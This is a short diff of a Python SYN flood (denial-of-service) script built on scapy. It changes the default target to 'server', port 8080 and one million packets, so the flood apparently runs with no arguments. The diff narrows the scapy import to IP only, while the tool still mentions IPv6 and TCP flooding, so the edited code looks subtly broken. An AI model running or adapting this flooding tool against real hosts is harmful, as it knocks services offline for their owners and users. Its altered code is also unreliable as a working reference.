@@ -1,10 +1,10 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
 # Emre Ovunc
 # info@emreovunc.com
 # Python3 SYN Flood Tool CMD v2.0.1
 
 from sys import stdout
-from scapy.all import *
+from scapy.all import IP
 from random import randint
 from argparse import ArgumentParser
 
@@ -72,9 +72,9 @@ def SYN_Flood_v6(dstIP, dstPort, counter):
 
 def main():
 	parser = ArgumentParser()
-	parser.add_argument('--target', '-t', help='target IP address')
-	parser.add_argument('--port', '-p', help='target port number')
-	parser.add_argument('--count', '-c', help='number of packets')
+	parser.add_argument('--target', '-t', help='target IP address', default="server")
+	parser.add_argument('--port', '-p', help='target port number', default="8080")
+	parser.add_argument('--count', '-c', help='number of packets', default="1000000")
 	parser.add_argument('--format', '-f', help='format of target(Can ignore, default use ipv4)')
 	parser.add_argument('--version', '-v', action='version', version='Python SynFlood Tool v2.0.1\n@EmreOvunc')
 	parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1 -f 6"
